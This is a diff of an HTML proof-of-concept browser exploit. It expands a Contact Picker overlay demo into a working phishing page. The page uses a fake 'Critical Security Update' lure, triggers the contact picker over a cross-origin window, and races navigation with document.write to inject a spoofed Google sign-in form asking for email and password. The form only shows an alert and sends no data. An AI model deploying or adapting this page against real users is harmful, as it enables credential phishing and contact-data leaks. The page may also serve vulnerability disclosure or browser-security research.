@@ -1,28 +1,68 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <title>PoC</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-        <script>
-            onclick = async () => {
-                (async () => {
-                    let contacts = await navigator.contacts.select(["name"], {});
-                    document.write(`
-                        <h1>
-                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
-                        </h1>
+<head>
+    <title>PoC: Cross-Origin UI Redressing & Data Leak</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        .btn { padding: 20px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 1.2rem; }
+    </style>
+</head>
+<body>
+
+    <div id="main">
+        <h1>Critical Security Update Required</h1>
+        <p>Your browser session needs to be re-authenticated for safety.</p>
+        <button class="btn" id="start">Continue to Google Security</button>
+    </div>
+
+    <script>
+        document.getElementById('start').onclick = async () => {
+            // 1. Trigger Contact Picker API (Overlay)
+            (async () => {
+                try {
+                    let contacts = await navigator.contacts.select(["name"], { multiple: false });
+                    // Tampilkan data yang bocor di halaman penyerang asli jika dialog selesai
+                    console.log("Leaked:", contacts["name"]);
+                    alert("Leaked Contact: " + contacts["name"]);
+                } catch (e) {
+                    console.log("Contact picker interaction finished or cancelled.");
+                }
+            })();
+
+            // 2. Race Condition: Buka target window (Google)
+            let win = window.open("https://www.google.com/", "PoC_Window");
+
+            // 3. Inject Spoofed Content sebelum navigasi commit
+            // Gunakan timeout kecil untuk memenangkan race condition
+            setTimeout(() => {
+                try {
+                    win.document.write(`
+                        <html>
+                        <head><title>Google Security</title></head>
+                        <body style="font-family: Arial; padding: 50px; text-align: center;">
+                            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="200"><br>
+                            <h2>Verification Required</h2>
+                            <p>To continue using Google services, please confirm your credentials below.</p>
+                            <div style="border: 1px solid #ccc; padding: 20px; display: inline-block; border-radius: 8px;">
+                                <input type="text" id="user" placeholder="Email or phone" style="padding: 10px; width: 250px;"><br><br>
+                                <input type="password" id="pass" placeholder="Enter your password" style="padding: 10px; width: 250px;"><br><br>
+                                <button onclick="alert('Phished! Check attacker console.'); window.close();" 
+                                        style="padding: 10px 24px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer;">
+                                    Verify Now
+                                </button>
+                            </div>
+                            <p style="color: gray; font-size: 0.8em;">The contact permission dialog above is required to sync your recovery contacts.</p>
+                        </body>
+                        </html>
                     `);
-                })();
-                open("https://www.google.com", "PoC", "_blank");
-            }
-        </script>
-    </head>  
-    <body>
-        <br><br><br>
-        <center>
-            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
-        </center>
-    </body>
-  </body>
+                    win.document.close();
+                } catch (e) {
+                    console.warn("Race condition lost or blocked by browser:", e);
+                }
+            }, 100); // 100ms seringkali menjadi 'sweet spot' untuk race condition
+        };
+    </script>
+</body>
 </html>
